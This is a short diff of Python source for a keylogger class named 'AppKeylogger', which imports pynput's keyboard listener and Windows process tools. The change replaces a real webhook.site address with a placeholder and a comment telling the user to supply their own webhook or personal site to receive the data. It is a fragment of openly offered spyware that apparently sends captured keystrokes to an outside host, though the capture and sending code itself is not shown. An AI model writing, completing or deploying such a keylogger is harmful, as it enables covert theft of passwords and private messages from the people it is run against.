@@ -7,7 +7,7 @@ import win32process
 import psutil
 from pynput import keyboard
 
-WEBHOOK_URL = "https://webhook.site/81a64f08-5e40-4dd2-8547-601e7ead08dc"  # <--- put your webhook endpoint here
+WEBHOOK_URL = "https://YOUR_WEBHOOK_LINK_OR_PERSONAL_SITE"  # <--- put your webhook or personal site endpoint here
 
 class AppKeylogger:
     def __init__(self):
